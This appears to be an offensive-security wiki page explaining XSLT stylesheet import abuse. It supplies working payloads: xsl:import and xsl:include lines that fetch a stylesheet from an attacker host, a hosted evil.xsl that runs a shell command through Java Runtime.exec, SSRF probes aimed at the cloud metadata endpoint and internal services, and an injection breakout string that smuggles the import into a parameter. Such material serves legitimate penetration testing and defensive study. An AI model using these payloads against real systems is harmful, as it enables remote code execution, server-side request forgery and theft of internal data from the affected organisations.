---
title: "Stylesheet import abuse: loading a remote stylesheet"
description: "xsl:import and xsl:include resolve attacker-controlled href URIs at compile time, pulling a remote stylesheet that supplies templates, extension calls, and SSRF."
keywords:
  - xsl:import
  - xsl:include
  - remote stylesheet
  - XSLT injection
  - SSRF
---

# Stylesheet import abuse

`xsl:import` and `xsl:include` splice another stylesheet into the current one, resolving the `href` URI when the stylesheet is compiled, before any node is matched. When an attacker controls that `href`, or controls stylesheet text where such an element can be placed, the engine fetches and compiles a stylesheet from a location of the attacker's choosing. A remote stylesheet is itself executable code, so this single element delivers whatever the engine supports: new templates, `document()` calls, and the extension-function and script payloads that give code execution, all hosted off the target and swapped out at will.

## Pulling a remote stylesheet

Both elements must appear as top-level children of `xsl:stylesheet`. Injected there, they load the attacker's file:

```xml
<xsl:import href="http://attacker.example/evil.xsl"/>
<xsl:include href="http://attacker.example/evil.xsl"/>
```

`xsl:import` brings in templates at lower precedence, so the included definitions fill in rather than clash; `xsl:include` merges at equal precedence. Either way the remote file runs. The hosted `evil.xsl` carries the real payload, for example a Java `Runtime.exec` binding or an `msxsl:script` block, keeping the injected request minimal while the dangerous code stays on the attacker's server:

```xml
<!-- evil.xsl served from attacker.example -->
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:value-of select="rt:exec(rt:getRuntime(), 'id')"/>
  </xsl:template>
</xsl:stylesheet>
```

## SSRF and fetch confirmation

Even when the fetched stylesheet is rejected (malformed, wrong version, scripting disabled), the compile-time fetch already happened, so the `href` is an SSRF primitive in its own right. Pointing it at an internal service or an attacker log confirms outbound reach and fingerprints the engine's URI handling:

```xml
<xsl:import href="http://169.254.169.254/latest/meta-data/"/>
<xsl:include href="http://internal.svc.local/health"/>
```

A hit on the attacker host proves the fetch fires and reveals the engine's user agent and source address; a parse error that echoes the fetched body leaks internal response content through the error message.

## Delivery vectors

The injection reaches the top level in two common shapes. Where the application concatenates a parameter into the stylesheet near its head, the value `"/><xsl:import href="http://attacker.example/evil.xsl"/><xsl:template match="x` closes the surrounding element and inserts the import. Where the application accepts an uploaded or referenced stylesheet outright, no breakout is needed: the import or include is simply part of the submitted document. Protocol support varies by engine, so `http`, `ftp`, and `jar:` URIs are each worth probing when the default `http` resolver is restricted.

## Tools

- **Burp Collaborator**: confirming the compile-time fetch of a remote stylesheet.
- **Burp Repeater**: injecting `xsl:import` and `xsl:include` with attacker-hosted hrefs.
- Manual testing with a hosted `evil.xsl` carrying the payload.

## References

- [W3C XSLT 2.0: Combining Stylesheets with xsl:include and xsl:import](https://www.w3.org/TR/xslt20/#include)
- [PayloadsAllTheThings: XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md)
